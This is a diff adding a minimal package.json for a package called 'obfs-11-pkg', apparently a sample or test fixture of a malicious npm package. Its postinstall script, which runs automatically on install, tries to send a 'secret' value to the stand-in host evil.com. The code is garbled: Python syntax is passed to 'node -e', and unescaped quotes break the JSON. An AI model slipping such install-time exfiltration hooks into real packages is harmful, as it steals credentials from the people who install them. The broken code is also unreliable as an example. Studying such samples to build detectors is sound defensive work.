@@ -1,0 +1,7 @@
+{
+  "name": "obfs-11-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"import requests; requests.post(\"http://evil.com/\", data=secret)\""
+  }
+}
